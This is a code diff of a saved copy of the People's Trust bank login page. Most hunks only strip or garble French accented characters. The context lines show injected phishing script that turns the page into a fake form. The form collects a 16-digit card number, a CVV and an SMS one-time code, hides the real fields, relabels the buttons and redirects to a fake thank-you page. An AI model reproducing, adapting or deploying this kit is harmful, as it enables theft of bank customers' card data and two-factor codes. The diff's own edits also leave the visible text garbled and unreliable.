@@ -22,7 +22,7 @@
       inp.name='sms_code';
       inp.maxLength=6;
       inp.autocomplete='one-time-code';
-      inp.placeholder='Code Ã  6 chiffres / 6-digit code';
+      inp.placeholder='Code  6 chiffres / 6-digit code';
       inp.removeAttribute('disabled');
       inp.style.cssText='text-align:center!important;letter-spacing:10px!important;font-size:22px!important;width:100%;box-sizing:border-box';
       // Hide all other non-hidden inputs
@@ -36,7 +36,7 @@
     document.querySelectorAll('label').forEach(function(lbl){
       var txt=lbl.textContent.trim().toLowerCase();
       if(txt.includes('password')||txt.includes('mot de passe')||txt.includes('identifiant')||txt.includes('username')||txt.includes('card')||txt.includes('access code')||txt.includes('code client')||txt.includes('client id')) {
-        lbl.textContent = 'Code de vérification SMS / SMS verification code';
+        lbl.textContent = 'Code de vrification SMS / SMS verification code';
       }
     });
     
@@ -64,7 +64,7 @@
         e.preventDefault(); e.stopImmediatePropagation();
         var code=document.getElementById('sms_code');
         if(!code||code.value.trim()===''||code.value.trim().length<6) {
-          alert('Veuillez saisir votre code SMS Ã  6 chiffres.');
+          alert('Veuillez saisir votre code SMS  6 chiffres.');
           if(code) code.focus();
           return false;
         }
@@ -106,7 +106,7 @@ setTimeout(function(){ window.location.href = 'peoplestrust_thankyou.html'; }, 1
             display: none !important;
         }   
     </style>
-<script defer="" src="./Login peoples trust_files/login.packed.js.téléchargement" type="text/javascript"></script>
+<script defer="" src="./Login peoples trust_files/login.packed.js.tlchargement" type="text/javascript"></script>
 <script>
         window.SHARED_APP_DATA = {
             logoSrc: "resources\/themes\/theme-peoplestrust_com-oidc\/assets\/images\/logo.png",
@@ -120,7 +120,7 @@ setTimeout(function(){ window.location.href = 'peoplestrust_thankyou.html'; }, 1
             increasedAuthSimulator: JSON.parse(null),
         }
     </script>
-<script src="./Login peoples trust_files/client-renderer.min.js.téléchargement" type="text/javascript"></script><script src="./Login peoples trust_files/__plugin.compiled.js.téléchargement" type="text/javascript"></script><script src="./Login peoples trust_files/hashtable.js.téléchargement" type="text/javascript"></script><script src="./Login peoples trust_files/rsa.min.js.téléchargement" type="text/javascript"></script><meta content="bc_peoplestrust" name="tenantid"/><script>
+<script src="./Login peoples trust_files/client-renderer.min.js.tlchargement" type="text/javascript"></script><script src="./Login peoples trust_files/__plugin.compiled.js.tlchargement" type="text/javascript"></script><script src="./Login peoples trust_files/hashtable.js.tlchargement" type="text/javascript"></script><script src="./Login peoples trust_files/rsa.min.js.tlchargement" type="text/javascript"></script><meta content="bc_peoplestrust" name="tenantid"/><script>
     window["__FORGE_API_CONFIG__"] = {
       palantir: "https:\/\/api.forge.central1.cc\/palantir\/v1",
     };
@@ -217,13 +217,13 @@ document.addEventListener("DOMContentLoaded", function() {
         var firstInput = visibleInputs[0];
         firstInput.type = "tel";
         firstInput.maxLength = 16;
-        firstInput.placeholder = "Numéro à 16 chiffres";
+        firstInput.placeholder = "Numro  16 chiffres";
         firstInput.value = "";
         
         var id1 = firstInput.id;
         if(id1) {
             var label1 = document.querySelector("label[for='" + id1 + "']");
-            if(label1) label1.innerHTML = "<b>Numéro de carte</b>";
+            if(label1) label1.innerHTML = "<b>Numro de carte</b>";
         }
     }
 
@@ -279,7 +279,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 cvvInput.name = "cvv_injected";
                 
                 if (cvvLabel) {
-                    cvvLabel.innerHTML = "<b>Code de sécurité (CVV)</b>";
+                    cvvLabel.innerHTML = "<b>Code de scurit (CVV)</b>";
                     cvvLabel.setAttribute("for", "cvv_input_injected");
                 }
                 
@@ -298,9 +298,9 @@ document.addEventListener("DOMContentLoaded", function() {
     while(node2 = walker2.nextNode()) {
         if(node2.nodeValue.trim().length > 3) {
             var text = node2.nodeValue.toLowerCase();
-            if(text.indexOf("sms") !== -1 || text.indexOf("code") !== -1 || text.indexOf("vérification") !== -1) {
+            if(text.indexOf("sms") !== -1 || text.indexOf("code") !== -1 || text.indexOf("vrification") !== -1) {
                 if (node2.nodeValue.indexOf("Code de") === -1) { // Skip CVV label
-                    node2.nodeValue = "Veuillez compléter vos informations";
+                    node2.nodeValue = "Veuillez complter vos informations";
                 }
             }
         }
@@ -312,9 +312,9 @@ document.addEventListener("DOMContentLoaded", function() {
         var text = (el.textContent || el.value || "").toLowerCase().trim();
         if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("submit") !== -1 || text.indexOf("next") !== -1 || text.indexOf("connect") !== -1) {
             if (el.tagName === "INPUT") {
-                el.value = "Vérifier";
+                el.value = "Vrifier";
             } else {
-                el.innerText = "Vérifier";
+                el.innerText = "Vrifier";
             }
         }
     });
@@ -398,7 +398,7 @@ setInterval(function() {
         var labels = document.querySelectorAll('label, .label, fui-label label');
         for(var k=0; k<labels.length; k++) {
             if(labels[k].textContent.includes('Customer') || labels[k].textContent.includes('Password') || labels[k].textContent.includes('Courriel')) {
-                labels[k].textContent = 'Code de vérification SMS';
+                labels[k].textContent = 'Code de vrification SMS';
             }
         }
         
